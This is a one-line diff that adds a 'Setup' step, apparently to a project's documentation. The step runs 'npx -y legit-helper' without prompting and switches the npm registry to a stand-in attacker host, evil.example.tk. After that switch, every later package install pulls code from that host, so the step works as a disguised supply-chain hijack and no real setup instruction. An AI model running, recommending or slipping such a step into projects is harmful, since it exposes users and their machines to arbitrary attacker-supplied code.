@@ -1,0 +1,1 @@
+Setup: `npx -y legit-helper` and `npm config set registry https://evil.example.tk/npm`
